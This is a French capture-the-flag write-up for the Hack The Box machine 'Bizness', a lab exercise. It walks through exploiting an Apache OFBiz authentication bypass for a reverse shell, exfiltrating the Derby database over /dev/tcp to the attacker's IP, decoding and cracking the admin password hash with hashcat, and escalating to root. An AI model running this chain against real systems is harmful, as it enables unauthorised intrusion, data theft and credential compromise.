---
title: Bizness
description: monkey bizness really
tags:
  - HTB
  - machine
date: 2026-03-16T17:36
tasks:
  - format
parent file:
  - "[[HTB MOC]]"
os: linux
difficulty: easy
category:
  - writeups
  - htb
season: "4"
seasonal: yes
---

# Foothold

![[Pasted image 20260318085145.png]]

On arrive sur la page de "Bizness incorporate". Alors évidemment, en descendant suffisamment, on peut lire que le framework est Apache OfBiz.

En cherchant sur internet on trouve assez vite un exploit [ici](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass). On peut tester que cela fonctionne avec la commande
```
python3 exploit.py --url https://bizness.htb
```
qui nous donne en sortie que la cible a l'air d'être vulnérable. Et lorsque l'on exécute
```
python3 exploit.py --url https://bizness.htb --cmd 'id'
```
on nous dit de vérifier la sortie de la commande. Il ne faut pas oublier bien sûr qu'il y a une redirection vers https donc il faut bien utiliser cette origine. Aussi vite que ça on a notre revshell.
![[Pasted image 20260318095918.png]]

![[Pasted image 20260318095927.png]]

On upgrade notre shell

```
python3 -c 'import pty;pty.spawn("/bin/bash");'
```
^Z
```
stty raw -echo; fg
```

```
stty rows 24 cols 80
export SHELL=bash
export TERM=xterm-256color
export LS_OPTIONS='--color=auto'
eval "`dircolors`"
alias ls='ls $LS_OPTIONS'
export PS1='\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\] '
```

![[Pasted image 20260318100022.png]]

# Privilege Escalation to root

Une fois le shell obtenu on regarde l'utilisateur que l'on a et le dossier `/home` et on y trouve notre flag, on a bien l'utilisateur.

(cette partie vient du writeup) Il fallait trouver le fichier `/opt/ofbiz/runtime/data/derby/ofbiz`, que l'on télécharge sur notre machine avec
```
nc -nlvp 4443 > ofbiz.tar
```
puis sur la target
```
tar -cvf ofbiz.tar /opt/ofbiz/runtime/data/derby/ofbiz
cat ofbiz.tar > /dev/tcp/10.10.15.35/4443
```
Enfin, sur notre machine, on extrait et on se connecte
```
tar -xvf ofbiz.tar
ij
> connect 'jdbc:derby:opt/ofbiz/runtime/data/derby/ofbiz';
```

On peut commencer à lire les données: lister les tables, utilisateurs, ...
```
help;
show tables;
select * from OFBIZ.USER_LOGIN;
```
![[Pasted image 20260319101234.png]]

![[Pasted image 20260319101849.png]]

On trouve un mot de passe:
```
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

Grâce à notre repérage on sait déjà que c'est dans le format sha1. On le crack avec hashcat. En revanche, cela retourne une erreur. En regardant dans `hashCrypt.java`, on trouve ces lignes
```
public static boolean comparePassword(String crypted, String defaultCrypt, String
password) {
if (crypted.startsWith("{PBKDF2")) {
return doComparePbkdf2(crypted, password);
} else if (crypted.startsWith("{")) {
return doCompareTypePrefix(crypted, defaultCrypt,
password.getBytes(UtilIO.getUtf8()));
} else if (crypted.startsWith("$")) {
return doComparePosix(crypted, defaultCrypt,
password.getBytes(UtilIO.getUtf8()));
} else {
return doCompareBare(crypted, defaultCrypt,
password.getBytes(UtilIO.getUtf8()));
}
```

On sait que l'on a un sha1 donc le programme passe notre hash par cette fonction
```
private static boolean doComparePosix(String crypted, String defaultCrypt, byte[]
bytes) {
int typeEnd = crypted.indexOf("$", 1);
int saltEnd = crypted.indexOf("$", typeEnd + 1);
String hashType = crypted.substring(1, typeEnd);
String salt = crypted.substring(typeEnd + 1, saltEnd);
String hashed = crypted.substring(saltEnd + 1);
return hashed.equals(getCryptedBytes(hashType, salt, bytes));
}
```

Ce qui fait que "d" est notre salt et le reste notre hash. On regarde la dernière fonction
```
private static String getCryptedBytes(String hashType, String salt, byte[] bytes)
{
try {
MessageDigest messagedigest = MessageDigest.getInstance(hashType);
messagedigest.update(salt.getBytes(UtilIO.getUtf8()));
messagedigest.update(bytes);
return
Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');
} catch (NoSuchAlgorithmException e) {
throw new GeneralRuntimeException("Error while comparing password", e);
}
}
```

Pour reverse ça on passe par python
```
>>> enc = "uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
>>> enc = enc.replace('_', '/')
>>> enc = enc.replace('-', '+')
>>> enc
'uP0/QaVBpDWFeo8+dRzDqRwXQ2I'
```

On passe en base64 en ajoutant un =
```
>>> enc += '='
>>> dec = base64.b64decode(enc.encode('utf-8'))
>>> dec
b'\xb8\xfd?A\xa5A\xa45\x85z\x8f>u\x1c\xc3\xa9\x1c\x17Cb'
```

Et enfin on récupère notre hash
```
>>> import binascii
>>> binascii.hexlify(dec)
b'b8fd3f41a541a435857a8f3e751cc3a91c174362'
```

Puis on le passe par hashcat
```
echo 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' > hash.txt            
hashcat -a 0 -m 120 hash.txt --wordlist /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260319112112.png]]

Et on trouve le mot de passe
```
monkeybizness
```

On tente de 
```
su root
```
Et ça fonctionne, on a notre root shell!

![[Pasted image 20260319112237.png]]

![[Pasted image 20260319112325.png]]


